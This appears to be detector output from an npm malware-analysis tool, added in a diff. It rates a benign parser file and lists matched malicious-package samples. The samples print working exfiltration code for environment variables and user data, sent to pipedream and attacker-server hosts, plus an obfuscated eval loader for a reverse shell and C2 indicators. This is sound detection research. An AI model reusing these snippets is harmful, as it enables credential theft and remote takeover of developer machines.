+                "code_snippet": "// Pseudocode based on report description\nconst os = require('os');\nconst fs = require('fs');\nconst archiver = require('archiver');\nconst http = require('http');\n\n// Collect username and working directory\nconst username = os.userInfo().username;\nconst cwd = process.cwd();\n\n// Send info to C2\nhttp.get(`http://attacker-server.com/collect?user=${username}&cwd=${cwd}`);\n\n// Search for sensitive files and directories\nconst targets = ['.env', '.gitlab', '.github'];\nconst exts = ['.asp', '.js', '.php'];\n// ...search logic...\n\n// Zip found files\n// ...archiving logic...\n\n// Upload to FTP server\n// ...FTP upload logic...",
+                "code_behavior": "At runtime, index.js collects the current OS username and working directory, transmits this information to a remote attacker-controlled server via HTTP GET, recursively searches the filesystem for sensitive files and directories (such as .env, .gitlab, .github, and files with extensions like .asp, .js, .php), archives the discovered files into a ZIP archive, and uploads the archive to a predefined external FTP server, resulting in exfiltration of sensitive developer data.",
+                "malice_analysis": {
+                  "why_suspicious": "Automated collection and exfiltration of user and file data to external servers is a hallmark of infostealer malware, especially when targeting developer secrets and project files.",
+                  "violated_expectations": "Legitimate packages do not search for, archive, or exfiltrate user files or environment information without explicit user consent and to trusted destinations.",
+                  "similar_legitimate_use": "Backup or deployment tools may archive and upload files, but only with user consent and to trusted, user-configured destinations—not to hardcoded, attacker-controlled infrastructure.",
+                  "key_indicators": [
+                    "collecting OS username and working directory without user interaction",
+                    "HTTP requests to hardcoded, attacker-controlled domains",
+                    "recursive search for sensitive files and directories",
+                    "creation of ZIP archives containing project or configuration files",
+                    "FTP upload of archives to external, untrusted servers"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (immediately after install, via detached process)",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "CryptoRocket",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (multiple versions, ongoing since 2021)",
+                  "why_malicious": "CryptoRocket is malicious because it is engineered to automatically execute code upon installation that exfiltrates sensitive data—including source code, configuration files, and environment information—from the developer's machine to attacker-controlled infrastructure. The package structure (package.json, preinstall.js, index.js) is intentionally orchestrated to enable stealthy data theft and unauthorized remote communication, with no legitimate functionality."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering the postinstall script in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of preinstall.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "preinstall.js spawns index.js as a detached background process to persist after installation.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "index.js runs independently in the background"
+                  },
+                  {
+                    "step": 3,
+                    "action": "index.js collects user and environment data, recursively searches for sensitive files, archives them, and exfiltrates the data to attacker-controlled infrastructure via HTTP and FTP.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Data exfiltration and compromise of developer secrets"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm package with postinstall script executing a custom JavaScript file (e.g., preinstall.js)",
+                    "installation-time spawning of detached background processes using child_process.spawn with detached: true",
+                    "runtime file system enumeration and archiving of sensitive files or directories",
+                    "network connections to hardcoded, untrusted external servers via HTTP or FTP",
+                    "creation and FTP upload of ZIP archives containing project or configuration files immediately after installation"
+                  ],
+                  "file_indicators": [
+                    "package.json with a postinstall script referencing preinstall.js",
+                    "presence of both preinstall.js and index.js in the package root directory",
+                    "creation of ZIP archives containing source code or configuration files in the user's project directory"
+                  ],
+                  "network_indicators": [
+                    "HTTP GET requests to attacker-controlled domains/IPs (see IOC list)",
+                    "FTP connections to unknown external servers for file uploads",
+                    "Domains: oastify.com, requestbin.net, canarytokens.com, oast.fun, pipedream.net, nirobtest.xyz, marcomayo.com, npmtesttut.com"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that launch custom JavaScript files, especially those that spawn detached background processes. Flag packages containing both preinstall.js and index.js with logic for file system enumeration and network exfiltration. Detect outbound HTTP or FTP connections to known malicious domains or IPs, and alert on ZIP archive creation containing sensitive project files immediately after package installation. Correlate these behaviors to identify coordinated data exfiltration attempts."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/dmr/0.2.10/package/lib/app/model-provider/dim-chained.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "dim-chained_slice_1",
+          "code_snippet": "module.exports = {\n    produce: function(string){\n        // input \"idc=*,format=*\"\n        // return { idc: '*', format: '*' }\n        let parten = {};\n        string.split(',').forEach(item => {\n            let r =  this.parseItem(item);\n            if (r){\n                parten[r.key] = r.value;\n            }\n        });\n        return parten;\n    },\n    parseItem: function(string) {\n        if (string === \"all\") {\n            return false;\n        }\n        let arr = string.split('=');\n        return {\n            key: arr[0],\n            value: decodeURIComponent(arr[1])\n        };\n    },\n    produceItem: function (key, value) {\n        if (value === \"_all\") {\n            return \"all\";\n        }\n        return  key + '=' + encodeURIComponent(value);\n    }\n};",
+          "is_malicious": false,
+          "malice_score": 0.4768250902493795,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code parses and constructs key-value pairs from input strings using decodeURIComponent and encodeURIComponent, accessing and modifying string data. No sensitive APIs such as network, file, or system execution are used, and no suspicious hardcoded data is present, resulting in purely data parsing and encoding behavior without security impact.",
+          "explanation": "[LLM Judgment: Benign] The provided code snippet is a simple utility module that parses and constructs key-value pairs from strings using standard JavaScript string operations and URI encoding/decoding functions. It does not use any sensitive or dangerous APIs such as eval(), network requests, file system access, or environment variable manipulation. Unlike the known malicious patterns, it does not perform any obfuscation, dynamic code execution, data exfiltration, or system information gathering. The behavior is purely data parsing and encoding, which is common and benign in many applications. The similarity scores to known malware patterns are low, and no suspicious operations or intent are present.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_102818_849651_snippet_4",
+              "source_package": "wf_ajax (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_102818_849651/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.48969677090644836,
+              "code_similarity": 0.451850950717926,
+              "behavior_similarity": 0.5275425910949707,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "function render(image){ eval(hexify(package,hexify(package,image))); }\nfunction hexilify(pack,data) {\n    const bufferText = Buffer.from(data, 'hex');\n    const text = bufferText.toString('ascii');\n    return text.replace('%%%%%%',pack);\n}",
+                "code_behavior": "At runtime, the code decodes hex-encoded payloads using hexilify(), then executes the decoded JavaScript using eval(), enabling dynamic execution of hidden malicious logic that can perform further data collection or exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "Use of eval() on dynamically decoded hex strings is a classic obfuscation and code injection technique, allowing attackers to hide and execute arbitrary payloads at runtime.",
+                  "violated_expectations": "Legitimate packages rarely, if ever, use eval() on decoded hex data, as this is a hallmark of obfuscated malware.",
+                  "similar_legitimate_use": "Some obfuscation libraries may use similar techniques, but not in open-source packages or for legitimate runtime logic.",
+                  "key_indicators": [
+                    "eval() on decoded hex string",
+                    "Custom hexilify() decoder function",
+                    "Obfuscated payload delivery at runtime"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when malicious code is executed)",
+                  "file_location": "hexilify() and eval() usage in main code files",
+                  "required_permissions": [
+                    "network",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "wf_ajax",
+                  "package_manager": "npm",
+                  "package_versions": "96.7.9, 99.10.9, and others (see list)",
+                  "why_malicious": "The RED-LILI campaign distributed hundreds of npm packages, including 'wf_ajax', containing highly obfuscated and evasive malicious code. These packages exfiltrate sensitive data, evade sandbox analysis, and establish persistence on victim systems. Tactics include executing code from files masquerading as documentation, embedding payloads in non-code files, anti-analysis logic, and spawning background processes to maintain access and continue data theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering the preinstall script that executes code from a documentation file.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of obfuscated payload hidden in README.md"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Obfuscated code in README.md or index.js is executed, performing anti-analysis checks to determine if the environment is a sandbox or automated scanner.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Conditional execution of main malicious payload if not in analysis environment"
+                  },
+                  {
+                    "step": 3,
+                    "action": "If anti-analysis checks pass, the main payload is decoded from hex and executed using eval(), enabling further malicious actions.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Data collection and exfiltration logic is activated"
+                  },
+                  {
+                    "step": 4,
+                    "action": "A detached background process is spawned to run bgService.js, maintaining persistence and enabling ongoing malicious activity.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Continued data exfiltration or further attacks after installation"
+                  },
+                  {
+                    "step": 5,
+                    "action": "Collected data is exfiltrated to attacker-controlled domains via outbound HTTP/S requests.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker receives sensitive data from compromised systems"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of README.md or other documentation files as code during npm install",
+                    "Presence of obfuscated JavaScript payloads in non-standard files (e.g., README.md)",
+                    "Use of eval() on dynamically decoded hex strings at runtime",
+                    "Preinstall scripts that spawn detached child processes (e.g., bgService.js)",
+                    "Anti-analysis logic such as UUID/hostname checks to evade sandboxes"
+                  ],
+                  "file_indicators": [
+                    "lib/README.md or README.md containing obfuscated JavaScript code",
+                    "package.json with preinstall script referencing documentation files (e.g., 'node lib/README.md')",
+                    "Presence of bgService.js or similarly named background service files in package directory"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/S connections to domains such as *.fuzzdb.cf, *.pipedream.net, *.requestbin.net, *.33mail.ga, *.22timer.ga",
+                    "Network activity initiated during or immediately after npm package installation"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for preinstall scripts that execute non-standard files, especially documentation files like README.md. Flag packages containing obfuscated JavaScript in documentation or non-code files. Detect use of eval() on decoded hex strings at runtime. Alert on packages that spawn detached child processes during install. Monitor for outbound network connections to known RED-LILI campaign domains or webhook services during or immediately after package installation."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_102818_710202_snippet_1",
+              "source_package": "epic-ue-loading (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_102818_710202/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4728497564792633,
+              "code_similarity": 0.48645222187042236,
+              "behavior_similarity": 0.45924729108810425,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "var data = process.env || {};\nif (\n  filter.some((entry) =>\n    [].concat(entry).every((item) => (data[item.key] || '').includes(item.val) || item.val === '*')\n  ) ||\n  Object.keys(data).length < 10\n) {\n  return;\n}\nvar req = http.request({\n  host: ['eoxb1lay4m45mms', 'm', ['pip', 'edream'].join(''), 'net'].join('.'),\n  path: '/' + (data.npm_package_name || ''),\n  method: 'POST',\n});\nreq.write(Buffer.from(JSON.stringify(data).toString('base64')));\nreq.end();",
+                "code_behavior": "At import-time or runtime, the code collects all environment variables from process.env, checks for sandbox indicators using a filter, and if not detected, exfiltrates the environment data via a POST request to a dynamically constructed, attacker-controlled domain, resulting in credential and secret theft.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses all environment variables and exfiltrates them to an external, obfuscated domain without user consent. The use of dynamic hostname construction and base64 encoding, combined with conditional logic to avoid sandboxes, is characteristic of data theft malware.",
+                  "violated_expectations": "Legitimate packages do not exfiltrate environment variables or send sensitive data to external webhooks, especially not at import-time or without explicit user consent. Telemetry or error reporting would be opt-in, clearly documented, and not obfuscated.",
+                  "similar_legitimate_use": "Some legitimate packages may collect environment data for debugging or telemetry, but only with user consent and transparent documentation. They do not obfuscate hostnames or exfiltrate all environment variables.",
+                  "key_indicators": [
+                    "Access to process.env and exfiltration of all environment variables",
+                    "Obfuscated and dynamically constructed webhook host using string concatenation",
+                    "Base64 encoding of exfiltrated data",
+                    "Network POST request to attacker-controlled domain at import-time",
+                    "Conditional logic to avoid execution in sandboxes"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time/runtime",
+                  "file_location": "build.js (main entry point in malicious versions)",
+                  "required_permissions": [
+                    "environment_vars",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "epic-ue-loading",
+                  "package_manager": "npm",
+                  "package_versions": "1.803.0, 2.802.0, 3.801.0, 4.800.0, 5.799.0, 6.798.0, 7.797.0, 8.796.0, 9.795.0 (malicious); 0.1.0 (benign)",
+                  "why_malicious": "Multiple versions of the package exfiltrate all environment variables to an attacker-controlled webhook, use obfuscated and dynamically constructed hostnames, and implement sandbox evasion techniques to avoid detection. The latest version (0.1.0) is benign to bypass security scanners, while the majority of versions are malicious and designed for dependency confusion attacks targeting build and CI/CD environments."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed as a dependency due to dependency confusion, leveraging high minor/patch version numbers to supersede internal packages.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code execution on the victim machine"
+                  },
+                  {
+                    "step": 2,
+                    "action": "On import or runtime, the code checks environment variables for known sandbox, CI/CD, or analysis indicators to evade detection.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "If not a sandbox or analysis environment, proceeds to data exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Collects all environment variables from the victim machine using process.env.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Prepares sensitive data for exfiltration"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Exfiltrates the collected environment variables to an attacker-controlled webhook using a POST request to a dynamically constructed subdomain.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive credentials and secrets from the victim environment"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to process.env and exfiltration of all environment variables to external domains",
+                    "Network POST requests to dynamically constructed subdomains of pipedream.net at import-time or runtime",
+                    "Conditional logic to evade sandboxes or CI/CD environments based on environment variable checks",
+                    "Obfuscated or programmatically constructed hostnames and filter lists in JavaScript code"
+                  ],
+                  "file_indicators": [
+                    "build.js containing both process.env access and http.request usage",
+                    "Obfuscated or minified code in non-production npm packages",
+                    "Presence of large, programmatically constructed filter lists for environment variable checks in build.js"
+                  ],
+                  "network_indicators": [
+                    "*.m.pipedream.net",
+                    "POST requests to subdomains such as eoxb1lay4m45mms.m.pipedream.net"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that access all environment variables and send them to external domains, especially at import-time or during installation. Flag packages with obfuscated or dynamically constructed code, large environment variable filter lists, or network requests to known exfiltration domains such as *.m.pipedream.net. Use both static and dynamic analysis to inspect all package versions, not just the latest, and correlate build.js file contents with suspicious network activity."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104012_987336_snippet_3",
+              "source_package": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104012_987336/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.47128739953041077,
+              "code_similarity": 0.5121555328369141,
+              "behavior_similarity": 0.43041926622390747,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "var os = require(\"os\"),\n    zlib = require(\"zlib\"),\n    bs = \"base64\",\n    filterNet = (o) => {\n        var oR = {};\n        for (var k in o) {\n            if (\"lo0\" == k) continue;\n            for (var i in o[k]) {\n                if (\"127.0.0.1\" == o[k][i][\"address\"]) continue;\n                if (o[k][i][\"family\"] == \"IPv4\" && o[k][i][\"address\"]) {\n                    oR[k] = o[k][i]\n                    break;\n                }\n            }\n        }\n        return oR;\n    },\n    rmKeys = (o, ...keys) => {\n        for (var k in keys) {\n            delete o[keys[k]];\n        }\n        return o;\n    },\n    pkg = JSON.parse(require(\"fs\").readFileSync(\"package.json\").toString(\"utf8\")),\n    zS = (s) => zlib.brotliCompressSync(s, { level: 11, windowBits: 15, quality: 11 }).toString(bs),\n    zO = (o) => zS(JSON.stringify(o, null, 2)),\n    uS = (s) => zlib.brotliDecompressSync(Buffer.from(s, bs)).toString(),\n    o = {\n        \"name\": pkg.name,\n        \"version\": pkg.version,\n        \"pwd\": process.cwd(),\n        \"env\": process.env,\n        \"platform\": os.platform(),\n        \"arch\": os.arch(),\n        \"release\": os.release(),\n        \"type\": os.type(),\n        \"uptime\": os.uptime(),\n        \"hostname\": os.hostname(),\n        \"cpus\": [os.cpus().length, rmKeys(os.cpus()[0], \"times\")],\n        \"networkInterfaces\": filterNet(os.networkInterfaces()),\n        \"freemem\": os.freemem(),\n        \"totalmem\": os.totalmem(),\n        \"userInfo\": os.userInfo()\n    };\nlet s = zO(o), s1 = uS(`G/sCIJwHtg1sfVPqObPQC6WsmlPZnVOfAqCQlUG+AJay52WlQRR23HYKiwLI/7ncvQM75zP689ZqjKlrgZVYcYBp1gM8R5zV4glyFKt+CPgOAIT7ekBlFUzW87zjyA6CooEMdzcFs33O/t2tAXawBJUI9pOdw8hOkS4DYLG9xHRAeDZ5ZXbs1oL+Z+k+M2aA4HzxpZD/VAbL7E8erim7UfCx9F/Y4+yCKMrUklhDVFoCdwwQYsUTOxl/nc+gLuTlglxBdupg+2xUfQt7zegHtGsz5GkVkFMdVd6qgszOQWOzY8FtLc/U7KSvB2Q4l4yGpcavIeSsCiZV7YQM5X3KWTMz8v1g55Yld/RldQTkyU91zlOFCeelQqC8qAIL4vEXNhgs2suqFHoQstfjXJpvHFgV0v7Bf8f7X38+oji8qZQUEG8LimNT5MDFKHJ5efBeZkZVIAKCp7gdzI60KAs=`);\nprocess.env.NODE_NO_EVAL = undefined;\neval(s1);",
+                "code_behavior": "At runtime, when rsh.js is executed as a detached process, the code collects detailed system, environment, and user information, compresses and encodes it, decompresses an obfuscated payload from a base64 string, sets the NODE_NO_EVAL environment variable to undefined, and executes the decompressed payload using eval, resulting in the execution of further malicious code.",
+                "malice_analysis": {
+                  "why_suspicious": "Collecting extensive system, environment, and user data, compressing and encoding it, and executing obfuscated code via eval are all strong indicators of malicious intent and are commonly used to evade detection and enable data exfiltration.",
+                  "violated_expectations": "Legitimate packages do not collect and exfiltrate system or user information, nor do they execute dynamically decompressed and obfuscated code via eval.",
+                  "similar_legitimate_use": "Compression and system info gathering may be used in legitimate diagnostics or telemetry, but not in combination with obfuscated payload execution and without user consent.",
+                  "key_indicators": [
+                    "Obfuscated and base64-encoded payload decompressed and executed via eval",
+                    "Systematic collection of system, environment, and user data",
+                    "Manipulation of environment variables to bypass security controls",
+                    "No user notification or consent for data collection or code execution"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when rsh.js is executed)",
+                  "file_location": "scripts/rsh.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.]",
+                  "package_manager": "npm",
+                  "package_versions": "[e.g., 6.0.2, 6.0.3, 6.0.4, 2.2.1, 2.2.3, 7.0.5, 5.0.2, 3.0.3]",
+                  "why_malicious": "All packages in this campaign execute obfuscated JavaScript code at install time, which collects extensive system, environment, and user information and establishes a persistent reverse shell to a remote attacker-controlled server (rsh.51pwn.com:8880), enabling full remote code execution and exfiltration of sensitive data. The attack chain is triggered via multiple npm lifecycle hooks, uses detached background processes for persistence, and employs obfuscation and dynamic code execution to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering preinstall, postinstall, test, or init scripts defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of scripts/init.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "scripts/init.js is executed, which launches scripts/rsh.js as a detached child process and immediately exits to conceal ongoing activity.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of scripts/rsh.js in the background"
+                  },
+                  {
+                    "step": 3,
+                    "action": "scripts/rsh.js collects detailed system, environment, and user data, compresses and encodes it, decompresses an obfuscated payload, and executes it via eval.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of reverse shell payload from decompressed code"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The reverse shell payload establishes a persistent connection to rsh.51pwn.com:8880, exfiltrates collected system information, and provides the attacker with remote shell access for arbitrary command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control over the compromised system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of scripts/init.js during npm install, test, or init lifecycle events",
+                    "Creation of detached child processes in install/test scripts (child_process.fork with {detached: true})",
+                    "Presence of obfuscated or base64-encoded JavaScript payloads in package files",
+                    "Use of eval to execute dynamically decompressed or generated code",
+                    "Outbound TCP connections to hardcoded C2 domains (e.g., rsh.51pwn.com:8880) during or after installation",
+                    "Collection and exfiltration of system, environment, and user data during package installation or execution"
+                  ],
+                  "file_indicators": [
+                    "scripts/init.js",
+                    "scripts/rsh.js",
+                    "package.json with install/test/init scripts running 'node ./scripts/init.js'",
+                    "Obfuscated JavaScript with base64-encoded or Unicode-escaped payloads"
+                  ],
+                  "network_indicators": [
+                    "rsh.51pwn.com:8880",
+                    "Outbound TCP connections to rsh.51pwn.com on port 8880",
+                    "Initial data exfiltration containing compressed system information"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of scripts during install, test, or init lifecycle events, especially those launching detached child processes or containing obfuscated/base64-encoded code. Flag any package that establishes outbound TCP connections to suspicious domains (e.g., rsh.51pwn.com) or uncommon ports during or after installation. Use static analysis to detect eval usage on dynamically decompressed payloads and the presence of Unicode-escaped or base64-encoded code. Alert on collection and exfiltration of system, environment, or user data during package installation or execution. Correlate file indicators (scripts/init.js, scripts/rsh.js, suspicious package.json scripts) with behavioral and network indicators for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_202035_950938_snippet_3",
+              "source_package": "pingan-vue-floating (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_202035_950938/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4678453207015991,
+              "code_similarity": 0.4940369725227356,
+              "behavior_similarity": 0.44165369868278503,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "const key = (37532).toString(36).toLowerCase()+(27).toString(36).toLowerCase().split('').map(function(S){return String.fromCharCode(S.charCodeAt()+(-39))}).join('')+(1166).toString(36).toLowerCase()+(function(){var v=Array.prototype.slice.call(arguments),A=v.shift();return v.reverse().map(function(N,Q){return String.fromCharCode(N-A-10-Q)}).join('')})(43,107,106,169,150,111,106)+(914).toString(36).toLowerCase()+(function(){var k=Array.prototype.slice.call(arguments),D=k.shift();return k.reverse().map(function(r,I){return String.fromCharCode(r-D-8-I)}).join('')})(36,167,112)\nconst url = (29945008).toString(36).toLowerCase()+(10).toString(36).toLowerCase().split('').map(function(R){return String.fromCharCode(R.charCodeAt()+(-39))}).join('')+(1147).toString(36).toLowerCase().split('').map(function(L){return String.fromCharCode(L.charCodeAt()+(-71))}).join('')+(function(){var R=Array.prototype.slice.call(arguments),k=R.shift();return R.reverse().map(function(o,v){return String.fromCharCode(o-k-3-v)}).join('')})(25,141)+(21).toString(36).toLowerCase()+(30).toString(36).toLowerCase().split('').map(function(g){return String.fromCharCode(g.charCodeAt()+(-71))}).join('')+(36100).toString(36).toLowerCase()+(function(){var V=Array.prototype.slice.call(arguments),h=V.shift();return V.reverse().map(function(A,M){return String.fromCharCode(A-h-48-M)}).join('')})(7,156,171)+(19172).toString(36).toLowerCase()+(30).toString(36).toLowerCase().split('').map(function(x){return String.fromCharCode(x.charCodeAt()+(-71))}).join('')+(23).toString(36).toLowerCase()+(function(){var S=Array.prototype.slice.call(arguments),k=S.shift();return S.reverse().map(function(I,L){return String.fromCharCode(I-k-51-L)}).join('')})(19,187,171)",
+                "code_behavior": "At runtime, the code dynamically generates an AES encryption key and a C2 server URL using obfuscated logic, concealing static configuration and making static analysis and detection more difficult.",
+                "malice_analysis": {
+                  "why_suspicious": "Obfuscated generation of keys and URLs is a hallmark of malware attempting to evade detection and analysis by hiding critical infrastructure details.",
+                  "violated_expectations": "Legitimate packages do not obfuscate static configuration like keys or URLs, as this hinders maintainability and transparency.",
+                  "similar_legitimate_use": "Obfuscation may be used in proprietary software to protect intellectual property, but not for C2 infrastructure in open-source packages.",
+                  "key_indicators": [
+                    "obfuscated string construction for keys and URLs",
+                    "dynamic C2 URL and key generation at runtime"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (daemonized by pm2)",
+                  "file_location": "app.js (last ~100 lines)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "pingan-vue-floating",
+                  "package_manager": "npm",
+                  "package_versions": "0.0.7",
+                  "why_malicious": "The package is malicious because it establishes a persistent, encrypted two-way communication channel with a remote command-and-control (C2) server upon installation, exfiltrates host and machine identifiers, and executes attacker-supplied, encrypted JavaScript payloads on the victim's machine. The package employs obfuscation, background daemonization, and anti-analysis techniques to evade detection and enable remote code execution, posing a severe risk to any system where it is installed."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Upon installation, the postinstall script executes index.js.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Daemonization of malicious process"
+                  },
+                  {
+                    "step": 2,
+                    "action": "index.js uses pm2 to launch app.js as a persistent background daemon.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of malicious logic in app.js"
+                  },
+                  {
+                    "step": 3,
+                    "action": "app.js checks for a marker file and, if absent, creates it and starts the heartbeat loop.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Initiation of periodic C2 communication"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Every 45 seconds, heartbeat collects host info and sends it (encrypted) to the C2 server.",
+                    "implemented_by": [
+                      "snippet_3",
+                      "snippet_4",
+                      "snippet_6"
+                    ],
+                    "leads_to": "C2 server can respond with encrypted payloads"
+                  },
+                  {
+                    "step": 5,
+                    "action": "If a payload is received, it is decrypted, base64-decoded, and executed via eval, enabling remote code execution.",
+                    "implemented_by": [
+                      "snippet_4",
+                      "snippet_6"
+                    ],
+                    "leads_to": "Attacker achieves arbitrary code execution on victim machine"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "postinstall script executing custom Node.js code during package installation",
+                    "pm2 used to daemonize scripts at install time, creating persistent background processes",
+                    "periodic (every 45 seconds) outbound HTTPS POST requests to hardcoded or obfuscated C2 domains",
+                    "AES-encrypted payloads in network traffic between host and C2 server",
+                    "eval execution of decrypted, network-supplied JavaScript code"
+                  ],
+                  "file_indicators": [
+                    "Presence of node_logs.txt in system temp directory",
+                    "Obfuscated or unusually large app.js file with benign exports and hidden malicious logic at the end",
+                    "index.js that only launches pm2 with app.js as the target script"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to ql.rustdesk.net or 62.234.32.226",
+                    "Encrypted payloads in POST body to /api/index and /api/captcha endpoints",
+                    "User-Agent string: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134"
+                  ],
+                  "how_to_detect": "Monitor for npm packages with postinstall scripts that launch pm2 or background daemons. Flag packages that create marker files in temp directories (e.g., node_logs.txt) and those that make periodic outbound HTTPS POST requests to suspicious or obfuscated domains, especially with encrypted payloads. Detect use of eval on decrypted network data. Analyze app.js files for obfuscated code and hidden logic at the end of otherwise benign files. Correlate network indicators such as connections to ql.rustdesk.net or 62.234.32.226 with the presence of AES-encrypted payloads and suspicious User-Agent strings."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205532_973234_snippet_3",
+              "source_package": " ()",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205532_973234/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.46294063329696655,
+              "code_similarity": 0.3957030773162842,
+              "behavior_similarity": 0.5301781892776489,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "const code = Buffer.from('ZXZpbCgnY29uc29sZS5sb2coSGVsbG8pJyk=', 'base64').toString('utf8');\neval(code);",
+                "code_behavior": "At runtime, the code decodes a base64-encoded string and executes the resulting code using eval, enabling dynamic and potentially obfuscated code execution.",
+                "malice_analysis": {
+                  "why_suspicious": "Dynamic code execution via eval, especially with decoded or obfuscated payloads, is a common technique for hiding malicious actions and evading static analysis.",
+                  "violated_expectations": "Legitimate packages should avoid using eval, particularly with dynamically decoded or untrusted content, due to the high risk of arbitrary code execution.",
+                  "similar_legitimate_use": "Some template engines or interpreters may use eval, but only with strict input validation and clear documentation.",
+                  "key_indicators": [
+                    "Use of Buffer.from(..., 'base64') for decoding",
+                    "Use of eval with dynamically generated or decoded content",
+                    "Obfuscated or hidden payloads in code",
+                    "Lack of input validation or sanitization"
+                  ]
